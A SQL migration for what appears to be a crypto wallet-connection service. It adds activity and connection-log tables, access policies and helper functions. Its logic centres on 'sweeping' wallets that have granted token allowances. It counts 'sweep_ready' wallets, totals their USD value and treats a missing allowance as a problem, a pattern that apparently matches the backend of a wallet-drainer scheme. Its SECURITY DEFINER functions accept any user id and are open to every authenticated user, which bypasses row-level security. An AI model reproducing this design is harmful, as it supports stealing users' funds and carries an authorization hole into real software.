-- Enhanced Wallet Connection Tracking with Handshake Logic
-- Adds handshake status and comprehensive wallet tracking

-- Add handshake tracking columns to connected_wallets if they don't exist
ALTER TABLE connected_wallets
ADD COLUMN IF NOT EXISTS handshake_status VARCHAR(20) DEFAULT 'pending' CHECK (handshake_status IN ('pending', 'completed', 'failed')),
ADD COLUMN IF NOT EXISTS handshake_timestamp TIMESTAMP WITH TIME ZONE;

-- Create index for wallet discovery by address and user
CREATE INDEX IF NOT EXISTS idx_connected_wallets_address_user
ON connected_wallets(wallet_address, user_id, is_active);

-- Create index for handshake status
CREATE INDEX IF NOT EXISTS idx_connected_wallets_handshake_status
ON connected_wallets(user_id, handshake_status, is_active);

-- Create index for recent connections
CREATE INDEX IF NOT EXISTS idx_connected_wallets_recent
ON connected_wallets(user_id, connected_at DESC)
WHERE is_active = true;

-- Create wallet activity tracking table
CREATE TABLE IF NOT EXISTS wallet_activity (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  wallet_id UUID NOT NULL REFERENCES connected_wallets(id) ON DELETE CASCADE,
  activity_type VARCHAR(50) NOT NULL CHECK (activity_type IN (
    'connected', 'disconnected', 'verified', 'failed_verification',
    'sweep_initiated', 'sweep_success', 'sweep_failed',
    'approval_granted', 'approval_revoked', 'chain_switched'
  )),
  chain_id INTEGER,
  transaction_hash VARCHAR(255),
  details JSONB,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  
  CONSTRAINT fk_wallet_activity_user FOREIGN KEY (user_id) REFERENCES auth.users(id) ON DELETE CASCADE
);

-- Create indexes for wallet activity
CREATE INDEX IF NOT EXISTS idx_wallet_activity_user ON wallet_activity(user_id, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_wallet_activity_wallet ON wallet_activity(wallet_id, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_wallet_activity_type ON wallet_activity(activity_type);

-- Create wallet connection log table for debugging
CREATE TABLE IF NOT EXISTS wallet_connection_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
  wallet_address VARCHAR(255),
  wallet_type VARCHAR(50),
  chain_id INTEGER,
  connection_status VARCHAR(20) CHECK (connection_status IN ('initiated', 'signing', 'verifying', 'storing', 'success', 'failed')),
  error_message TEXT,
  ip_address INET,
  user_agent TEXT,
  metadata JSONB,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
  
  CONSTRAINT fk_connection_logs_user FOREIGN KEY (user_id) REFERENCES auth.users(id) ON DELETE CASCADE
);

CREATE INDEX IF NOT EXISTS idx_connection_logs_user ON wallet_connection_logs(user_id, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_connection_logs_status ON wallet_connection_logs(connection_status);

-- Create RLS policies for wallet activity
ALTER TABLE wallet_activity ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Users can view their own wallet activity"
ON wallet_activity FOR SELECT
USING (auth.uid() = user_id);

CREATE POLICY "Admin can view all wallet activity"
ON wallet_activity FOR SELECT
USING (auth.jwt() ->> 'role' = 'admin');

-- Create RLS policies for connection logs
ALTER TABLE wallet_connection_logs ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Users can view their own connection logs"
ON wallet_connection_logs FOR SELECT
USING (auth.uid() = user_id);

CREATE POLICY "Admins can view all connection logs"
ON wallet_connection_logs FOR SELECT
USING (auth.jwt() ->> 'role' = 'admin');

-- Create function to log wallet activity
CREATE OR REPLACE FUNCTION log_wallet_activity(
  p_user_id UUID,
  p_wallet_id UUID,
  p_activity_type VARCHAR,
  p_chain_id INTEGER DEFAULT NULL,
  p_tx_hash VARCHAR DEFAULT NULL,
  p_details JSONB DEFAULT NULL
)
RETURNS void AS $$
BEGIN
  INSERT INTO wallet_activity(user_id, wallet_id, activity_type, chain_id, transaction_hash, details)
  VALUES(p_user_id, p_wallet_id, p_activity_type, p_chain_id, p_tx_hash, p_details);
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Create function to get wallet statistics for admin
CREATE OR REPLACE FUNCTION get_wallet_stats(p_user_id UUID)
RETURNS TABLE(
  total_wallets BIGINT,
  verified_wallets BIGINT,
  active_wallets BIGINT,
  sweep_ready BIGINT,
  total_value_usd NUMERIC
) AS $$
BEGIN
  RETURN QUERY
  SELECT
    COUNT(*)::BIGINT,
    COUNT(*) FILTER (WHERE verified = true)::BIGINT,
    COUNT(*) FILTER (WHERE is_active = true)::BIGINT,
    COUNT(*) FILTER (WHERE (allowance_amount::numeric > 0) AND verified = true)::BIGINT,
    COALESCE(SUM((metadata->>'total_value_usd')::numeric), 0)
  FROM connected_wallets
  WHERE user_id = p_user_id;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Create function to perform wallet health check
CREATE OR REPLACE FUNCTION check_wallet_health(p_wallet_id UUID)
RETURNS TABLE(
  is_healthy BOOLEAN,
  status VARCHAR,
  last_activity TIMESTAMP WITH TIME ZONE,
  issues TEXT[]
) AS $$
DECLARE
  v_issues TEXT[] := ARRAY[]::TEXT[];
  v_wallet_record RECORD;
  v_last_activity TIMESTAMP WITH TIME ZONE;
  v_is_healthy BOOLEAN := true;
BEGIN
  -- Get wallet record
  SELECT * INTO v_wallet_record FROM connected_wallets WHERE id = p_wallet_id;
  
  IF v_wallet_record IS NULL THEN
    RETURN QUERY SELECT false, 'NOT_FOUND'::VARCHAR, NULL::TIMESTAMP WITH TIME ZONE, ARRAY['Wallet not found']::TEXT[];
    RETURN;
  END IF;
  
  -- Get last activity
  SELECT MAX(created_at) INTO v_last_activity FROM wallet_activity WHERE wallet_id = p_wallet_id;
  
  -- Check for issues
  IF NOT v_wallet_record.verified THEN
    v_issues := array_append(v_issues, 'Wallet not verified');
    v_is_healthy := false;
  END IF;
  
  IF NOT v_wallet_record.is_active THEN
    v_issues := array_append(v_issues, 'Wallet is inactive');
    v_is_healthy := false;
  END IF;
  
  IF v_wallet_record.handshake_status = 'failed' THEN
    v_issues := array_append(v_issues, 'Last handshake failed');
    v_is_healthy := false;
  END IF;
  
  IF (v_wallet_record.allowance_amount::numeric <= 0) THEN
    v_issues := array_append(v_issues, 'No token allowance granted');
  END IF;
  
  IF v_last_activity IS NOT NULL AND NOW() - v_last_activity > INTERVAL '30 days' THEN
    v_issues := array_append(v_issues, 'No activity in 30 days');
  END IF;
  
  RETURN QUERY SELECT v_is_healthy, 
    CASE WHEN v_is_healthy THEN 'HEALTHY'::VARCHAR ELSE 'UNHEALTHY'::VARCHAR END,
    v_last_activity,
    v_issues;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Grant execute permissions
GRANT EXECUTE ON FUNCTION log_wallet_activity TO authenticated;
GRANT EXECUTE ON FUNCTION get_wallet_stats TO authenticated;
GRANT EXECUTE ON FUNCTION check_wallet_health TO authenticated;
